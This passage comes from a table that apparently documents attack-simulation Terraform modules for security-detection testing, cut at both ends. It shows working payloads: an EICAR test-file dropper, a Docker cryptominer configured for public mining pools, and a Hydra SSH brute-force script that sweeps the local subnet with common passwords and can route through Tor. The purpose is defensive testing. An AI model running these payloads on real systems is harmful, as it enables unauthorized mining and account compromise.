script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| target-ssm-drop-malware-eicar                                              | ./modules/ssm/drop-malware-eicar                               | ssm_deploy_malware_eicar                   | context.aws.ssm.target.drop.malware.eicar                                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "drop": {<br/>                        "malware": {<br/>                            "eicar": {<br/>                                "eicar_path": "/tmp/eicar",<br/>                                "enabled": false<br/>                            }<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/drop-malware-eicar                               | <pre>locals &&#35;123;<br/>    eicar&&#35;95;string&&#35;95;base64 = &quot;WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=&quot;<br/>    eicar&&#35;95;path = var&#46;inputs&&#35;91;&quot;eicar&&#35;95;path&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        log &quot;creating eicar file: $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&#45;$&&#35;40;hostname&&#35;41;&quot;<br/>        rm &#45;rf $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&&#35;42;<br/>        echo &#45;n &&#35;x27;$&&#35;123;base64decode&&#35;40;local&#46;eicar&&#35;95;string&&#35;95;base64&&#35;41;&&#35;125;&&#35;x27; &gt; $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&#45;$&&#35;40;hostname&&#35;41;<br/>        log &quot;$&&#35;40;ls &#45;l $&&#35;123;local&#46;eicar&&#35;95;path&&#35;125;&#45;$&&#35;40;hostname&&#35;41;&&#35;41;&quot;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| target-ssm-execute-docker-cpu-miner                                        | ./modules/ssm/execute-docker-cpu-miner                         | ssm_exec_docker_cpuminer                   | context.aws.ssm.target.execute.docker_cpu_miner                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_cpu_miner": {<br/>                            "enabled": false,<br/>                            "minergate_image": "mkell43/minerd",<br/>                            "minergate_name": "minerd",<br/>                            "minergate_server": "stratum+tcp://eth.pool.minergate.com:45791",<br/>                            "minergate_user": null,<br/>                            "nicehash_image": "a2ncer/nheqminer_cpu:latest",<br/>                            "nicehash_name": "nicehash",<br/>                            "nicehash_server": "equihash.usa.nicehash.com:3357",<br/>                            "nicehash_user": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-cpu-miner                         | <pre>locals &&#35;123;<br/>    &#35; nicehash&&#35;95;name = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;name&quot;&&#35;93;<br/>    &#35; nicehash&&#35;95;image = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;image&quot;&&#35;93;<br/>    &#35; nicehash&&#35;95;server = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;server&quot;&&#35;93;<br/>    &#35; nicehash&&#35;95;user = var&#46;inputs&&#35;91;&quot;nicehash&&#35;95;user&quot;&&#35;93;<br/>    minergate&&#35;95;name = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;name&quot;&&#35;93;<br/>    minergate&&#35;95;image = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;image&quot;&&#35;93;<br/>    minergate&&#35;95;server = var&#46;inputs&&#35;91;&quot;minergate&&#35;95;server&quot;&&#35;93;<br/>    minergate&&#35;95;user=var&#46;inputs&&#35;91;&quot;minergate&&#35;95;user&quot;&&#35;93;<br/><br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        if &&#35;91;&&#35;91; &&#35;96;sudo docker ps &#124; grep $&&#35;123;local&#46;minergate&&#35;95;name&&#35;125;&&#35;96; &&#35;93;&&#35;93;; then docker stop $&&#35;123;local&#46;minergate&&#35;95;name&&#35;125;; fi<br/>        sudo docker run &#45;&#45;rm &#45;d &#45;&#45;network=host &#45;&#45;name $&&#35;123;local&#46;minergate&&#35;95;name&&#35;125; $&&#35;123;local&#46;minergate&&#35;95;image&&#35;125; &#45;a cryptonight &#45;o $&&#35;123;local&#46;minergate&&#35;95;server&&#35;125; &#45;u $&&#35;123; local&#46;minergate&&#35;95;user &&#35;125; &#45;p x<br/>        sudo docker ps &#45;a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    log &quot;Done&#46;&quot;<br/>    EOT<br/>    <br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &lt;&lt;&#45;EOT<br/>        log &quot;Checking for docker&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v docker &gt; /dev/null &#124;&#124; &#33; docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready &#45; waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $&&#35;40;command &#45;v  docker&&#35;41;&quot;<br/>        EOT<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| target-ssm-execute-docker-hydra                                            | ./modules/ssm/execute-docker-hydra                             | ssm_exec_docker_hydra_target               | context.aws.ssm.target.execute.docker_hydra                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_hydra": {<br/>                            "attack_delay": 50400,<br/>                            "custom_password_list": [],<br/>                            "custom_user_list": [],<br/>                            "enabled": false,<br/>                            "password_list": "/opt/passwords/darkweb2017-top10.txt",<br/>                            "scan_local_network": true,<br/>                            "targets": [],<br/>                            "use_tor": false,<br/>                            "user_list": "/opt/usernames/top-usernames-shortlist.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-hydra                             | <pre>locals &&#35;123;<br/>    attack&&#35;95;dir = &quot;/hydra&quot;<br/>    targets = flatten&&#35;40;&&#35;91; for target in var&#46;inputs&&#35;91;&quot;targets&quot;&&#35;93;: can&&#35;40;split&&#35;40;&quot;/&quot;, target&&#35;41;&&#35;91;1&&#35;93;&&#35;41; ? <br/>        &&#35;91; for host&&#35;95;number in range&&#35;40;pow&&#35;40;2, 32 &#45; split&&#35;40;&quot;/&quot;, target&&#35;41;&&#35;91;1&&#35;93;&&#35;41;&&#35;41; : cidrhost&&#35;40;target, host&&#35;95;number&&#35;41; &&#35;93;<br/>        :<br/>        &&#35;91; target &&#35;93;<br/>    &&#35;93;&&#35;41;<br/>    base64&&#35;95;command&&#35;95;payload = var&#46;inputs&&#35;91;&quot;payload&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    &#35; Function to convert IP address to decimal<br/>    ip&&#35;95;to&&#35;95;dec&&#35;40;&&#35;41; &&#35;123;<br/>        local IFS=&#46;<br/>        read ip1 ip2 ip3 ip4 &lt;&lt;&lt; &quot;$1&quot;<br/>        echo &quot;$&&#35;40;&&#35;40;ip1 &&#35;42; 16777216 &#43; ip2 &&#35;42; 65536 &#43; ip3 &&#35;42; 256 &#43; ip4&&#35;41;&&#35;41;&quot;<br/>    &&#35;125;<br/><br/>    &#35; Function to convert decimal to IP address<br/>    dec&&#35;95;to&&#35;95;ip&&#35;40;&&#35;41; &&#35;123;<br/>        local ip dec=$1<br/>        for e in &&#35;123;3&#46;&#46;0&&#35;125;; do<br/>            &&#35;40;&&#35;40;octet = dec / &&#35;40;256 &&#35;42;&&#35;42; e&&#35;41; &&#35;41;&&#35;41;<br/>            &&#35;40;&&#35;40;dec &#45;= octet &&#35;42; 256 &&#35;42;&&#35;42; e&&#35;41;&&#35;41;<br/>            ip&#43;=&quot;$$&&#35;123;octet&&#35;125;&#46;&quot;<br/>        done<br/>        echo &quot;$$&&#35;123;ip%?&&#35;125;&quot;<br/>    &&#35;125;<br/><br/>    &#35; Main function to generate IP list from CIDR<br/>    generate&&#35;95;ips&&#35;40;&&#35;41; &&#35;123;<br/>        local cidr=&quot;$1&quot;<br/>        local ip=&quot;$$&&#35;123;cidr%/&&#35;42;&&#35;125;&quot;<br/>        local prefix=&quot;$$&&#35;123;cidr&#35;&&#35;42;/&&#35;125;&quot;<br/>        local netmask=$&&#35;40;&&#35;40;0xffffffff ^ &&#35;40;&&#35;40;1 &lt;&lt; &&#35;40;32 &#45; prefix&&#35;41;&&#35;41; &#45; 1&&#35;41;&&#35;41;&&#35;41;<br/><br/>        local start=$&&#35;40;ip&&#35;95;to&&#35;95;dec &quot;$ip&quot;&&#35;41;<br/>        local start=$&&#35;40;&&#35;40;start &amp; netmask&&#35;41;&&#35;41;<br/>        local end=$&&#35;40;&&#35;40;start &#124; &&#35;40;&&#35;40;1 &lt;&lt; &&#35;40;32 &#45; prefix&&#35;41;&&#35;41; &#45; 1&&#35;41;&&#35;41;&&#35;41;<br/><br/>        for &&#35;40;&&#35;40;ip= start; ip &lt;= end; ip&#43;&#43;&&#35;41;&&#35;41;; do<br/>            dec&&#35;95;to&&#35;95;ip &quot;$ip&quot;<br/>        done<br/>    &&#35;125;<br/><br/>    log &quot;cleaning app directory&quot;<br/>    rm &#45;rf $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    mkdir &#45;p $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    cd $&&#35;123;local&#46;attack&&#35;95;dir&&#35;125;<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting script&#46;&#46;&#46;&quot;<br/>        LOCAL&&#35;95;NET=$&&#35;40;ip &#45;o &#45;f inet addr show &#124; awk &&#35;x27;/scope global/ &&#35;123;print $4&&#35;125;&&#35;x27; &#124; head &#45;1&&#35;41;<br/>        log &quot;LOCAL&&#35;95;NET: $LOCAL&&#35;95;NET&quot;<br/>        log &quot;Targets: $&&#35;123;join&&#35;40;&quot;,&quot;, local&#46;targets&&#35;41;&&#35;125;&quot;<br/>        echo &quot;$&&#35;123; length&&#35;40;local&#46;targets&&#35;41; &gt; 0 ? join&&#35;40;&quot;&&#35;92;n&quot;, local&#46;targets&&#35;41; : &quot;$&&#35;40;generate&&#35;95;ips $LOCAL&&#35;95;NET&&#35;41;&quot; &&#35;125;&quot; &gt; /tmp/hydra&#45;targets&#46;txt<br/>        cat &gt; /tmp/hydra&#45;users&#46;txt &lt;&lt;&&#35;x27;EOF&&#35;x27;<br/>    $&&#35;123;try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;username&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;username : &quot;root&quot; &&#35;125;<br/>    EOF<br/>        cat &gt; /tmp/hydra&#45;passwords&#46;txt &lt;&lt;&&#35;x27;EOF&&#35;x27;<br/>    123456<br/>    123456789<br/>    111111<br/>    password<br/>    qwerty<br/>    abc123<br/>    12345678<br/>    password1<br/>    1234567<br/>    123123<br/>    $&&#35;123;try&&#35;40;length&&#35;40;var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;password&&#35;41;,&quot;false&quot;&&#35;41; &#33;= &quot;false&quot; ? var&#46;inputs&&#35;91;&quot;ssh&&#35;95;user&quot;&&#35;93;&#46;password : &quot;&quot; &&#35;125;<br/>    EOF<br/>        if sudo docker ps &#45;a &#124; grep $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;; then <br/>        sudo docker stop $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>        sudo docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;<br/>        fi<br/>        truncate &#45;s 0 /tmp/hydra&#45;found&#46;txt<br/>        $&&#35;123; var&#46;inputs&&#35;91;&quot;use&&#35;95;tor&quot;&&#35;93; == true ? &lt;&lt;&#45;EOF<br/>        log &quot;Using tor network&#46;&#46;&#46;&quot;<br/>        if &#33; docker ps &#124; grep torproxy &gt; /dev/null; then<br/>        sudo docker run &#45;d &#45;&#45;rm &#45;&#45;name torproxy &#45;p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$&&#35;40;docker inspect &#45;f &&#35;x27;&&#35;123;&&#35;123;range &#46;NetworkSettings&#46;Networks&&#35;125;&&#35;125;&&#35;123;&&#35;123;&#46;IPAddress&&#35;125;&&#35;125;&&#35;123;&&#35;123;end&&#35;125;&&#35;125;&&#35;x27; torproxy&&#35;41;<br/>        log &quot;Running: proxychains hydra &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;e TORPROXY=$TORPROXY &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; hydra &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        log &quot;Running: proxychains hydra &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;e TORPROXY=$TORPROXY &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; hydra &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        EOF<br/>        : &lt;&lt;&#45;EOF<br/>        log &quot;Running: hydra &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;&#45;entrypoint=hydra &#45;&#45;name $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; $&&#35;123;var&#46;inputs&&#35;91;&quot;image&quot;&&#35;93;&&#35;125; &#45;V &#45;L $&&#35;123;var&#46;inputs&&#35;91;&quot;user&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;P $&&#35;123;var&#46;inputs&&#35;91;&quot;password&&#35;95;list&quot;&&#35;93;&&#35;125; &#45;o /tmp/hydra&#45;found&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh &#124;&#124; true&quot;<br/>        sudo /bin/bash &#45;c &quot;docker logs $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash &#45;c &quot;docker rm $&&#35;123;var&#46;inputs&&#35;91;&quot;container&&#35;95;name&quot;&&#35;93;&&#35;125;&quot;<br/>        log &quot;Running: hydra &#45;V &#45;L /tmp/hydra&#45;users&#46;txt &#45;P /tmp/hydra&#45;passwords&#46;txt &#45;M /tmp/hydra&#45;targets&#46;txt &#45;dvV &#45;t 4 &#45;u &#45;w 10 ssh&quot;<br/>        sudo /bin/bash &#45;c &quot;docker run &#45;v /tmp:/tmp &#45;&#45;entrypoint=hydra 